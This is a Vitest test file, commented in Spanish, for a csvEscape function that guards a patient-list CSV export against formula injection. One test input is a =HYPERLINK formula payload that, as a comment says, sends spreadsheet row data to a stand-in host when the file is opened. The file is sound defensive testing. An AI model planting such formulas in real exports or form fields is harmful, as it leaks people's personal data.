import { describe, expect, it } from "vitest"

import { csvEscape } from "@/components/export-csv-button"

// La auditoría del 30-jul cerró CSV injection en las dos exportaciones de facturación pero dejó
// fuera este componente genérico, que es el que baja la lista de Pacientes. Mismo test que
// `facturacion/domain/__tests__/finance.test.ts`, sobre el otro camino.
describe("csvEscape", () => {
  it("neutraliza los cuatro prefijos de fórmula", () => {
    expect(csvEscape("=1+1")).toBe("'=1+1")
    expect(csvEscape("+34600000000")).toBe("'+34600000000")
    expect(csvEscape("-5")).toBe("'-5")
    expect(csvEscape("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)")
  })

  it("el caso real: un nombre que abre una fórmula no se ejecuta en Excel", () => {
    // `=HYPERLINK(...)` en el nombre de un paciente exfiltra la fila al abrir el archivo.
    expect(csvEscape('=HYPERLINK("http://x/?"&A1,"Firulais")')).toBe(
      `"'=HYPERLINK(""http://x/?""&A1,""Firulais"")"`,
    )
  })

  it("sigue entrecomillando lo que ya entrecomillaba", () => {
    expect(csvEscape("Pérez; Ana")).toBe('"Pérez; Ana"')
    expect(csvEscape('dijo "hola"')).toBe('"dijo ""hola"""')
    expect(csvEscape("linea1\nlinea2")).toBe('"linea1\nlinea2"')
  })

  it("no toca el texto normal ni los números", () => {
    expect(csvEscape("Firulais")).toBe("Firulais")
    expect(csvEscape(42)).toBe("42")
    expect(csvEscape(null)).toBe("")
    expect(csvEscape(undefined)).toBe("")
  })
})
